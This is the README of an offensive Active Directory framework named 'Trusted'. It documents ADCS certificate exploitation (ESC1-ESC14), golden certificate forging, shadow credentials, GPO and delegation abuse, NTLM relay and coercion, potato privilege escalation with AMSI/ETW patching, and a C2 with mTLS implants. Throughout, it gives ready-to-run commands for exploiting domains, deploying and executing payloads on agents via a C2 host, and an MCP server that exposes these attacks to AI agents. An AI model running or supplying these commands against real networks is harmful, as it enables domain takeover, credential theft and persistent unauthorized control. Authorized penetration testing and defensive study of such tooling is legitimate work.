# Trusted

ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go, CGO-free.

## Features

### ADCS / PKI Exploitation
- **ESC1-ESC14** complete vulnerability detection, scoring, and exploitation
- **Real certificate enrollment** via CA web endpoint (/certsrv/) — not just local forging
- **NTLM pass-the-hash** for both LDAP and HTTP enrollment (`--hash` flag)
- **ESC1** Misconfigured templates (enrollee supplies subject + auth EKU)
- **ESC2** Any Purpose EKU templates (enrollee supplies subject)
- **ESC3** Enrollment Agent templates (two-stage: agent cert → enroll on behalf)
- **ESC4** Vulnerable template ACLs — full binary ACE parsing, WriteDACL/WriteOwner, LDAP modify + auto-restore
- **ESC5** Vulnerable PKI object ACLs on CA
- **ESC6** EDITF_ATTRIBUTESUBJECTALTNAME2 — SAN injection via CA enrollment service flags
- **ESC7** Vulnerable CA ACLs — ManageCA → enable ESC6 → enroll → auto-restore
- **ESC8** HTTP web enrollment relay detection + PetitPotam auto-coercion
- **ESC9** CT_FLAG_NO_SECURITY_EXTENSION — UPN swap exploitation with auto-restore
- **ESC10** Weak certificate mapping detection (CertificateMappingMethods)
- **ESC11** RPC interface encryption enforcement detection
- **ESC12** DCOM interface abuse on CA with network HSM key storage
- **ESC13** OID group link abuse via msDS-OIDToGroupLink
- **ESC14** Weak explicit mappings via altSecurityIdentities
- **Golden certificate forging** — self-signed or sign with extracted CA key
- **Shadow Credentials** — msDS-KeyCredentialLink add/list/remove (key persisted before LDAP write)
- **Auto-pwn** — enumerate → prioritize → exploit → PKINIT commands in one shot
- **PetitPotam coercion** — MS-EFSRPC via stateful SMB2/DCE/RPC session
- **WebDAV coercion** — relay from non-admin pivot using custom port >1024

### GPO Attacks
- **GPO enumeration** — LDAP-based discovery, ACL parsing, GPP password extraction
- **Scheduled task deployment** via GPO modification
- **Startup/shutdown/logon/logoff script injection**
- **Local admin group modification** via Restricted Groups
- **User rights assignment** via GPO
- **Registry setting modification**
- **File deployment** via GPO
- **Service creation/modification** via GPO
- **Security policy modification** — password policy, firewall, Windows Defender, UAC, ETW
- **GPO creation, linking/unlinking** to OUs/sites/domains
- **OU manipulation** — create, delete, move objects
- **SCF/LNK file deployment** for hash capture
- **BloodHound JSON export** and GPO-BH correlation
- **GPO backup, restore, and cleanup**
- **CoerceToTGT chain** — `--tgt`: coerce → relay → cert → PKINIT → TGT
- **SMB-based GPO file system manipulation**
- **Sysvol GPO template and GPT.INI parsing**

### Delegation Attacks
- **Full delegation enumeration** — unconstrained, constrained, RBCD
- **Unconstrained delegation detection** via UAC flags and SPN scanning
- **Constrained delegation exploitation** via S4U2Self/S4U2Proxy
- **RBCD exploitation** with machine account creation
- **Machine account lifecycle management** — create, delete, set password
- **Delegation attribute manipulation** — set/remove constrained delegation
- **RBCD attribute manipulation** — set/remove msDS-AllowedToActOnBehalfOfOtherIdentity

### C2 Framework
- HTTP/HTTPS listeners with auto-generated TLS certificates
- Session management: registration, polling, command queue, result collection
- **Certificate persistence**: cert-auth implants via forged certificates (Schannel mTLS)
- **Polling agent**: cross-platform, mTLS support, signal-aware shutdown
- **File delivery**: upload and deploy binaries to agents with optional execution
- Agent command output capped at 10MB (OOM prevention)

### SmartPotato — Windows Privilege Escalation
- **JuicyPotato** — BITS COM object abuse + named pipe impersonation
- **SweetPotato** — PrintSpoofer via Print Spooler named pipe trigger
- **RoguePotato** — DCE/RPC OXID resolver redirect with auto netsh port proxy setup/cleanup
- AMSI/ETW patching (AmsiScanBuffer + EtwEventWrite)
- Auto-detect best technique based on running services

### Operational Tooling
- **Engagement reporting** — markdown format with severity tables, attack paths, remediation
- **JSON output** — `--json` flag for pipeline integration
- **PFX import/export** — load and inspect PKCS12 files
- **Stealth mode** — jittered LDAP queries, randomized page sizes
- **LDAPS/StartTLS** — encrypted LDAP connections via `--ldaps` / `--start-tls`
- **MCP server** — 5 tools for agentic integration (pki_enumerate, pki_forge, c2_*)
- **TUI operator console** — live C2 session polling, command dispatch, 5 views
- **Certificate theft playbook** — THEFT1-THEFT5 with certutil/mimikatz/SharpDPAPI commands

## Quick Start

```bash
# Build
CGO_ENABLED=0 go build -o trusted ./cmd/trusted

# Build SmartPotato for Windows
cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
```

> 'ted' can be used as an alias for 'trusted'. Both are shown for documentation parity.

### Enumeration

```bash
# Basic enumeration
trusted enum -d corp.local -dc dc01 -u user -p pass

# With LDAPS
ted enum -d corp.local -dc dc01 -u user -p pass -L

# With pass-the-hash (no plaintext password needed)
ted enum -d corp.local -dc dc01 -u user -H aad3b435b51404eeaad3b435b51404ee

# JSON output
ted enum -d corp.local -dc dc01 -u user -p pass -j

# Stealth mode (jittered queries)
ted enum -d corp.local -dc dc01 -u user -p pass -s
```

### Exploitation

```bash
# ESC1 — misconfigured template
trusted esc 1 -t VulnTemplate -U admin@corp.local -d corp.local -dc dc01 -u user -p pass

# ESC4 — writable template ACLs (modifies, exploits as ESC1, restores)
ted esc 4 -t WritableTemplate -U admin@corp.local -d corp.local -dc dc01 -u user -p pass

# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 (SAN injection)
ted esc 6 -t AnyTemplate -U admin@corp.local -d corp.local -dc dc01 -u user -p pass

# ESC7 — ManageCA abuse (enable ESC6 → exploit → restore)
ted esc 7 -c CorpCA -U admin@corp.local -d corp.local -dc dc01 -u user -p pass

# ESC8 — NTLM relay with auto PetitPotam coercion
ted esc 8 -t Machine -d corp.local -dc dc01 -u user -p pass -l 10.0.0.5

# ESC9 — UPN swap (modifies attacker UPN, enrolls, restores)
ted esc 9 -t NoSecExt -U admin@corp.local --adn "CN=attacker,CN=Users,DC=corp,DC=local"

# ESC13 — OID group link abuse
ted esc 13 -t LinkedPolicy -U admin@corp.local -d corp.local -dc dc01 -u user -p pass

# Scan-only (detection + guidance)
ted esc 5 -d corp.local -dc dc01 -u user -p pass
ted esc 10 -d corp.local -dc dc01 -u user -p pass -j
ted esc 14 -d corp.local -dc dc01 -u user -p pass

# Relay attacks
ted esc 11 -t Machine -U admin@corp.local -l 10.0.0.5
ted esc 12 -t Machine -U admin@corp.local -l 10.0.0.5
```

### Auto-Pwn

```bash
# Full auto: enumerate → exploit highest-scoring path → PKINIT → UnPAC
trusted auto -d corp.local -dc dc01 -U admin@corp.local -u user -p pass

# Dry run: enumerate and plan only, don't exploit
ted auto --dry-run -d corp.local -dc dc01 -U admin@corp.local -u user -p pass

# Interactive path selection
ted auto -i -d corp.local -dc dc01 -U admin@corp.local -u user -p pass
```

### Certificate Operations

```bash
# Forge golden certificate (with extracted CA key + cert)
trusted forge -U admin@corp.local --ca-key ca.key --ca-cert ca.crt -o admin

# Forge self-signed cert (for testing)
ted forge -U admin@corp.local -o test

# Import and inspect PFX
ted import cert.pfx
ted import cert.pfx -P <password> -j

# Certificate theft playbook (accepts 1-5 or all)
ted theft all
ted theft 4 -d corp.local -dc dc01 -u user -p pass -L -o certs_out

# Generate engagement report
ted report -d corp.local -dc dc01 -u user -p pass -o findings.md
```

### Shadow Credentials

```bash
# Add shadow credential (sAMAccountName auto-resolves DN via LDAP)
trusted shadow add victim -d corp.local -dc dc01 -u user -p pass

# List shadow credentials
ted shadow list victim -d corp.local -dc dc01 -u user -p pass

# Remove by device ID
ted shadow rm victim --device-id <guid> -d corp.local -dc dc01 -u user -p pass
```

### GPO Attacks

```bash
# Enumerate GPOs
trusted gpo --enum -d corp.local -dc dc01 -u user -p pass

# Examine ACLs on a GPO
ted gpo --acl --gpo "Default Domain Policy"

# Deploy scheduled task via GPO
ted gpo --exploit task --gpo "Vulnerable GPO" --task-name "Updater" --command cmd.exe --args "/c whoami"

# Create and link a malicious GPO
ted gpo --create --name "Evil GPO"
ted gpo --link --gpo "Evil GPO" --target "OU=Workstations,DC=corp,DC=local"

# Extract GPP passwords
ted gpo --gpp

# Modify security policy (password/lockout)
ted gpo --policy --set-password-min 8 --set-lockout 5

# BloodHound integration
ted gpo --bloodhound -o gpo_attack_paths.json

# Coerce auth for relay
ted gpo --coerce --method PetitPotam --target dc01 -l 10.0.0.5

# CoerceToTGT chain: coerce → relay → cert → PKINIT → TGT
ted gpo --tgt --target dc01 -l 10.0.0.5 -U admin@corp.local -d corp.local -dc dc01 -u user -p pass
ted gpo --tgt --target dc01 -l 10.0.0.5 -U admin@corp.local --ca-host ca01.corp.local --template DomainController
```

### Delegation Attacks

```bash
# Enumerate all delegation configurations
trusted deleg enum -d corp.local -dc dc01 -u user -p pass

# Exploit constrained delegation (S4U2Self)
ted deleg constrained --spn cifs/file01 --user admin

# Exploit RBCD (requires machine account)
ted deleg rbcd --target COMPUTER$

# Create machine account for RBCD
ted deleg create --target EVIL$ --pass "P@ssw0rd!"

# Remove delegation attributes
ted deleg remove --target COMPUTER$
```

### C2

```bash
# Start HTTPS listener
trusted c2 start -b 0.0.0.0 -p 8443

# Generate stager config
ted c2 stager --url https://c2.example.com:8443 -o stager.json

# Generate cert-auth implant (mTLS)
ted c2 implant cert-auth -U admin@corp.local --url https://c2.example.com:8443

# Run polling agent
trusted agent --config stager.json

# Deploy file to active session
ted c2 deploy -s <ID> -f ./payload -p /tmp/svc --execute

# Operator console with live C2 data
ted c2 console --url http://localhost:8080

# MCP server for agentic integration
trusted mcp
```

## Architecture

```
cmd/trusted/         CLI entry points (cobra)
  main.go               Root command with `ted` alias + 14 persistent connection flags
  pki.go                esc/enum/forge/import/report/theft commands
  autopwn.go            Auto-pwn orchestration
  shadow.go             Shadow credentials CLI (add/list/rm)
  c2.go                 C2 listener, stager/implant generation, deploy, console
  agent.go              Polling agent
  gpo.go                GPO attack toolkit
  deleg.go              Delegation attack framework
  mcp_cmd.go            MCP stdio server
  deploy.go             runDeploy helper (shared with c2.go)
  console.go            runConsole helper (shared with c2.go)
pkg/pki/
  adcs.go               LDAP enumeration, template scoring, ESC1/ESC4 exploits, cert forging
  enroll.go             Real certificate enrollment via CA web endpoint (/certsrv/)
  ntlm.go               NTLMv2 HTTP RoundTripper with pass-the-hash (inline MD4)
  coerce.go             PetitPotam MS-EFSRPC coercion (stateful SMB2/DCE/RPC)
  esc2.go - esc14.go    Individual ESC scan + exploit functions
  esc_relay.go          ESC8/ESC11/ESC12 relay scanning (HTTP probe, RPC flag check, DCOM probe)
  shadow_credentials.go msDS-KeyCredentialLink operations
  autopwn.go            Auto-pwn engine (enumerate → prioritize → exploit)
  report.go             Markdown engagement report generation
  chain.go              Attack path analysis and prioritization
  pkinit.go             PKINIT command/script generation
  unpac.go              UnPAC-the-hash command generation
  certtheft.go          THEFT1-THEFT5 playbook
  security_descriptor.go Binary SD/ACE/SID parsing for ESC4/ESC5
  output.go             EnumerationResult struct, EnumerateAll aggregator
  pfx.go                PFX import/export
  smb.go                Native SMB2 session setup (used by smb_relay.go)
  smb_relay.go          Native SMB NTLM TCP relay (ESC11/ESC12, no certipy-ad dep)
pkg/gpo/
  gpo.go                GPO types, constants, parsing helpers
  ldap.go               LDAP discovery, GPO/OU CRUD, ACL query, link manipulation
  exploit.go            GPO modification for tasks, scripts, restricted groups, user rights, registry, services, files
  acl.go                Binary ACE/SID parsing and write-permission analysis
  sysvol.go             GPT.INI parsing, GPP template discovery, password decryption
  smb.go                SCF/LNK generation, SMB file system operations
  policy.go             Security policy modification (password, firewall, Defender, UAC, ETW)
  bloodhound.go         BloodHound JSON export, GPO-BH correlation, attack path analysis
  restore.go            GPO backup, restore, cleanup, audit log export
pkg/delegation/
  delegation.go         Delegation types, UAC parsing, SID encoding, report generation
  ldap.go               LDAP delegation enumeration, attribute manipulation, machine account CRUD
  s4u.go                S4U2Self/S4U2Proxy implementation (Kerberos S4U extensions)
pkg/c2/
  listener.go           HTTP/HTTPS C2 listener with session management
  agent.go              Polling agent with mTLS, file delivery, output limits
  deploy.go             File delivery endpoints
  certauth.go           Cert-auth implant generation
pkg/util/
  util.go               Domain DN building, username normalization, input validation
internal/mcp/
  server.go             MCP JSON-RPC stdio server (5 tools)
internal/tui/
  app.go                Bubbletea operator console with live C2 polling
implants/smartpotato/
  potato_windows.go     JuicyPotato, SweetPotato, RoguePotato (Windows)
  potato_other.go       Stub for non-Windows builds
```

## Dependencies

All pure Go, `CGO_ENABLED=0` compatible:

| Package | Purpose |
|---------|---------|
| `github.com/spf13/cobra` | CLI framework |
| `github.com/go-ldap/ldap/v3` | Native LDAP client |
| `github.com/charmbracelet/bubbletea` | TUI framework |
| `github.com/charmbracelet/bubbles` | TUI widgets |
| `github.com/charmbracelet/lipgloss` | TUI styling |
| `software.sslmate.com/src/go-pkcs12` | PKCS12/PFX handling |
| `github.com/Azure/go-ntlmssp` | NTLM authentication for HTTP |
| `github.com/google/uuid` | UUID generation |

NTLM authentication uses a built-in NTLMv2 implementation with inline MD4 — no external crypto dependencies.
